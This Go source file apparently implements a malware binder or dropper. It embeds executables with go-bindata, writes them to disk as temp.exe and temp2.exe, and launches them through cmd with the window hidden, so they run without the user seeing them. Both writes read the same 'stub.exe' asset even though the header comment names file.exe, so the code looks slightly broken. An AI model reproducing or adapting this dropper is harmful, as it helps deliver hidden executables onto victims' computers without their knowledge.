//go-bindata -nomemcopy -o assets.go stub.exe file.exe
package main

import "os/exec"
import "syscall"
import "io/ioutil"


func Run(cmd string) {
	e := exec.Command("cmd", "/C", cmd)
	e.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	e.Run()
}

func main() {
	data, _ := Asset("stub.exe")
	data2, _ := Asset("stub.exe")

	ioutil.WriteFile("temp.exe", []byte(data), 0777)
	Run("start temp.exe")

	ioutil.WriteFile("temp2.exe", []byte(data2), 0777)
	Run("start temp2.exe")
}